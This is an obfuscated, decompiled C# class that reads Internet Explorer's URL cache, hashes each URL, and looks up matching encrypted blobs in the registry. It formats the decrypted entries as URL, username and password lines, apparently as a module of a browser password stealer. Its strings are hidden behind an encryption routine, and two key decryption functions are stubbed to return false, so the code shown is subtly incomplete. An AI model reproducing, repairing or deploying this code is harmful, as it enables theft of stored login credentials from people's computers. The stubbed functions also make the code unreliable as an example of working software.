using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns4;

namespace ns1;

internal class Class18
{
	public struct Struct6
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;
	}

	public struct Struct7
	{
		public int int_0;

		public FILETIME filetime_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct Struct8
	{
		public int int_0;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string string_0;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string string_1;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public FILETIME filetime_0;

		public FILETIME filetime_1;

		public FILETIME filetime_2;

		public FILETIME filetime_3;

		public IntPtr intptr_0;

		public int int_6;

		public IntPtr intptr_1;

		public int int_7;
	}

	public struct Struct9
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static string string_0;

	public static readonly uint uint_0 = 32771u;

	public static readonly uint uint_1 = 26113u;

	public static readonly uint uint_2 = 26114u;

	public static readonly uint uint_3 = 26625u;

	public static string string_1 = Class6.smethod_0("dq2vxLmEsK6sj4yhu7+1kqS9rIuRsq7CsIiyaZW6k6q4wqeVmpK+toiqtbmIkrC2w552srjCo4qjeyY=", "False");

	public static string string_2 = "";

	[DllImport("advapi32.dll")]
	public static extern bool CryptAcquireContext(ref IntPtr intptr_0, string string_3, string string_4, uint uint_4, uint uint_5);

	public static bool smethod_0(IntPtr intptr_0, int int_0, byte[] byte_0, ref int int_1, int int_2)
	{
		return false;
	}

	[DllImport("advapi32.dll")]
	public static extern bool CryptReleaseContext(IntPtr intptr_0, uint uint_4);

	[DllImport("advapi32.dll")]
	public static extern bool CryptCreateHash(IntPtr intptr_0, uint uint_4, IntPtr intptr_1, uint uint_5, ref IntPtr intptr_2);

	[DllImport("advapi32.dll")]
	public static extern bool CryptHashData(IntPtr intptr_0, IntPtr intptr_1, int int_0, uint uint_4);

	[DllImport("advapi32.dll")]
	public static extern bool CryptDestroyHash(IntPtr intptr_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.LPTStr)] string string_3, IntPtr intptr_0, ref int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool FindNextUrlCacheEntry(IntPtr intptr_0, IntPtr intptr_1, ref int int_0);

	public static bool smethod_1(ref Struct9 struct9_0, int int_0, ref Struct9 struct9_1, int int_1, int int_2, int int_3, ref Struct9 struct9_2)
	{
		return false;
	}

	public static void smethod_2()
	{
		object obj = Registry.CurrentUser.OpenSubKey(string_1, writable: true);
		if (obj == null)
		{
			string_0 = Class6.smethod_0("g56psKKDnqmwooOeqbCig56psKKDnqmwomaq2ufKuM/R54WL2dzf1LjG3pOig56psKKDnqmwooOeqbCig56psKKDnqmwBA==", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("hLi2vrqUasnLboGvuMvElLwZ", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("Yn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn0j", "False");
			return;
		}
		int num = 2;
		int int_ = 0;
		FindFirstUrlCacheEntry(null, IntPtr.Zero, ref int_);
		if (Marshal.GetLastWin32Error() == 259)
		{
			return;
		}
		int num2 = int_;
		IntPtr intPtr = Marshal.AllocHGlobal(num2);
		checked
		{
			try
			{
				IntPtr intptr_ = FindFirstUrlCacheEntry(null, intPtr, ref int_);
				bool flag;
				do
				{
					Struct8 @struct = (Struct8)Marshal.PtrToStructure(intPtr, typeof(Struct8));
					string text = @struct.string_0;
					text = text.ToLower();
					text = text.Substring(text.IndexOf(Class6.smethod_0("WS4=", "False")) + 1);
					if (text.IndexOf(Class6.smethod_0("cBY=", "False")) > 0)
					{
						text = text.Substring(0, text.IndexOf(Class6.smethod_0("cBY=", "False")));
					}
					string text2 = smethod_3(text, (text.Length + 1) * 2);
					try
					{
						byte[] array = (byte[])Registry.CurrentUser.OpenSubKey(string_1)!.GetValue(text2, null);
						if (array != null)
						{
							if (!string_2.Contains(text))
							{
								smethod_5(text, text2, array.Length, array);
								string_2 = string_2 + text + Class6.smethod_0("VhE=", "False");
							}
						}
						else
						{
							text += Class6.smethod_0("Xhg=", "False");
							string text3 = smethod_3(text, (text.Length + 1) * 2);
							byte[] array2 = (byte[])Registry.CurrentUser.OpenSubKey(string_1)!.GetValue(text3, null);
							if (array2 != null && !string_2.Contains(text))
							{
								smethod_5(text, text3, array2.Length, array2);
								string_2 = string_2 + text + " ";
							}
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex, num);
						string_0 = Class6.smethod_0("g56psKKDnqmwooOeqbCig56psKKDnqmwomaq2ufKuM/R54WL2dzf1LjG3pOig56psKKDnqmwooOeqbCig56psKKDnqmwBA==", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("hLi2vrqUasnLboGvuMvElLwZ", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("Yn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn2Ij4FifYiPgWJ9iI+BYn0j", "False");
						ProjectData.ClearProjectError();
						break;
					}
					int_ = num2;
					if (((flag = FindNextUrlCacheEntry(intptr_, intPtr, ref int_)) || Marshal.GetLastWin32Error() != 259) && !flag && int_ > num2)
					{
						num2 = int_;
						IntPtr cb = new IntPtr(num2);
						intPtr = Marshal.ReAllocHGlobal(intPtr, cb);
						flag = true;
					}
				}
				while (flag);
			}
			finally
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
	}

	public static string smethod_3(string string_3, int int_0)
	{
		string result = default(string);
		try
		{
			byte[] array = new byte[21];
			string text = "";
			int int_ = 20;
			IntPtr intptr_ = default(IntPtr);
			CryptAcquireContext(ref intptr_, null, null, 1u, 0u);
			IntPtr intptr_2 = default(IntPtr);
			CryptCreateHash(intptr_, 32772u, IntPtr.Zero, 0u, ref intptr_2);
			CryptHashData(intptr_2, smethod_6(string_3), int_0, 0u);
			smethod_0(intptr_2, 2, array, ref int_, 0);
			CryptDestroyHash(intptr_2);
			CryptReleaseContext(intptr_, 0u);
			int location = 0;
			while (location < 20)
			{
				text += Strings.Right(Class6.smethod_0("WHMg", "False") + array[location].ToString(Class6.smethod_0("kA8=", "False")), 2);
				Math.Max(Interlocked.Increment(ref location), checked(location - 1));
			}
			text += Strings.Right(Class6.smethod_0("WHMg", "False") + smethod_4(text).ToString(Class6.smethod_0("kA8=", "False")), 2);
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte smethod_4(string string_3)
	{
		byte result = default(byte);
		try
		{
			int num = 0;
			int location = 1;
			while (location < string_3.Length)
			{
				if (location % 2 != 0)
				{
					num = checked(num + Convert.ToInt32(Conversion.Val(Class6.smethod_0("UY4d", "False") + Strings.Mid(string_3, location, 2))));
				}
				Math.Max(Interlocked.Increment(ref location), checked(location - 1));
			}
			byte b = Convert.ToByte(num % 256);
			result = b;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_5(string string_3, string string_4, int int_0, byte[] byte_0)
	{
		Struct9 struct9_ = default(Struct9);
		Struct9 struct9_2 = default(Struct9);
		Struct9 struct9_3 = default(Struct9);
		Struct6 @struct = default(Struct6);
		Struct7 struct2 = default(Struct7);
		IntPtr intPtr = Marshal.AllocHGlobal(int_0);
		checked
		{
			try
			{
				Marshal.Copy(byte_0, 0, intPtr, int_0);
				struct9_.int_0 = int_0;
				struct9_.intptr_0 = intPtr;
				struct9_3.int_0 = (string_3.Length + 1) * 2;
				struct9_3.intptr_0 = smethod_6(string_3);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (!smethod_1(ref struct9_, 0, ref struct9_3, 0, 0, 0, ref struct9_2))
				{
					return;
				}
				IntPtr ptr = new IntPtr(struct9_2.intptr_0.ToInt32() + unchecked((int)Marshal.ReadByte(struct9_2.intptr_0)));
				@struct = (Struct6)Marshal.PtrToStructure(ptr, @struct.GetType());
				if (@struct.int_4 != 1 || @struct.int_2 < 2)
				{
					return;
				}
				IntPtr ptr2 = new IntPtr(ptr.ToInt32() + @struct.int_1);
				IntPtr intPtr2 = new IntPtr(ptr2.ToInt32() + (@struct.int_2 + 0) * Marshal.SizeOf((object)struct2));
				int location = 0;
				string_0 = string_0 + Class6.smethod_0("dZCbopR1kJuilHWQp9PLncXMystYmNbVw6fFw9eUdZCbopR1kJuilHWQmxE=", "False") + Environment.NewLine + Environment.NewLine;
				while ((double)location < (double)@struct.int_2 / 2.0)
				{
					if (location != 0)
					{
						ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)struct2));
					}
					struct2 = (Struct7)Marshal.PtrToStructure(ptr2, struct2.GetType());
					IntPtr ptr3 = new IntPtr(intPtr2.ToInt32() + struct2.int_0);
					string text = Marshal.PtrToStringAuto(ptr3);
					ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf((object)struct2));
					struct2 = (Struct7)Marshal.PtrToStructure(ptr2, struct2.GetType());
					ptr3 = new IntPtr(intPtr2.ToInt32() + struct2.int_0);
					string text2 = Marshal.PtrToStringAuto(ptr3);
					string_0 = string_0 + Class6.smethod_0("i6OonXUQ", "False") + string_3 + Environment.NewLine;
					string_0 = string_0 + Class6.smethod_0("b6iluad7oqWBWSw=", "False") + text + Environment.NewLine;
					string_0 = string_0 + Class6.smethod_0("gKzJ0MafvbqXbxY=", "False") + text2 + Environment.NewLine;
					string_0 += Environment.NewLine;
					Math.Max(Interlocked.Increment(ref location), location - 1);
				}
				string_0 += Class6.smethod_0("fJeiqZt8l6Kpm3yXoqmbfJeiqZt8l6Kpm3yXoqmbfJcJ", "False");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static IntPtr smethod_6(object object_0)
	{
		IntPtr result = default(IntPtr);
		try
		{
			result = GCHandle.Alloc(RuntimeHelpers.GetObjectValue(object_0), GCHandleType.Pinned).AddrOfPinnedObject();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
